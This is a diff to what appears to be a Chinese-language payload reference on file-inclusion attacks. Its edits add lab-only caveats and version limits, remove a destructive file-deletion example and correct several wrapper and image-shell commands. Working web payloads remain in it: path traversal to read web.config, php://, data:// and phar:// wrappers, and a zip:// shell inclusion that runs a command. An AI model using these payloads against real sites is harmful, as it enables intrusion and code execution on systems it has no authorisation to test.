@@ -255,7 +255,7 @@ curl "https://target/download.aspx?file=../web.config"
   不要尝试用读到的密钥登录任何服务
 
 # 任意文件删 → 瘫痪服务
-DELETE /api/upload?path=../../web/index.html → 首页消失
+仅在隔离沙箱删除研究员预建的可丢弃 PoC 文件；不要针对生产 index.html 发删除请求。
 ```
 
 参考 wooyun 案例：
@@ -403,6 +403,8 @@ _共 163 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 
 - Insecure Temporary File：1 条
 
 
+> 下列日志投毒、反弹 shell、敏感文件与 session 枚举片段属于实验室历史参考，不是生产执行授权。执行边界以入口确认、最小非敏感测试文件和项目规则为准。PHP wrapper 支持、配置和旧版 null-byte/编码行为必须按目标版本核对；不要将所有片段视为通用可运行链。
+
 ## Payload 库
 
 _12 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_
@@ -439,7 +441,7 @@ _使用PHP伪协议_
 ```
 php://filter/convert.base64-encode/resource=config.php
 php://input (POST数据作为输入)
-php://data://text/plain,<?php phpinfo();?>
+data://text/plain,<?php phpinfo();?>
 phar://archive.zip/shell.php
 ```
 
@@ -811,7 +813,7 @@ _使用多重过滤器_
 ?file=php://filter/read=string.strip_tags/resource=index.php
 ```
 
-**3. 3. Filter链RCE**
+**3. 3. Filter 转换示例（不单独证明 RCE）**
 _使用高级过滤器_
 ```
 # 使用iconv过滤器
@@ -1050,10 +1052,10 @@ _包含Zip文件执行代码_
 _使用图片马上传_
 ```
 # 创建图片马
-copy image.jpg+shell.zip image.jpg
+copy /b image.jpg+shell.zip combined.jpg
 
 # 或使用
-cat image.jpg shell.zip > image.jpg
+cat image.jpg shell.zip > combined.jpg
 
 # 包含
 ?file=zip://uploads/image.jpg%23shell.txt&c=id
@@ -1082,6 +1084,8 @@ zip outer.zip inner.zip
 ---
 
 ### Phar反序列化攻击  `lfi-phar`
+
+版本限制：PHP 8.0 起，打开 Phar 不再自动反序列化元数据；显式 `Phar::getMetadata()` 等调用及可用 gadget 类仍须逐项确认。仅有 phar 扩展或 LFI 不足以证明这条 RCE 链。
 利用Phar反序列化进行RCE
 子类：**Phar反序列化** · tags: `lfi` `phar` `deserialization` `rce`
 
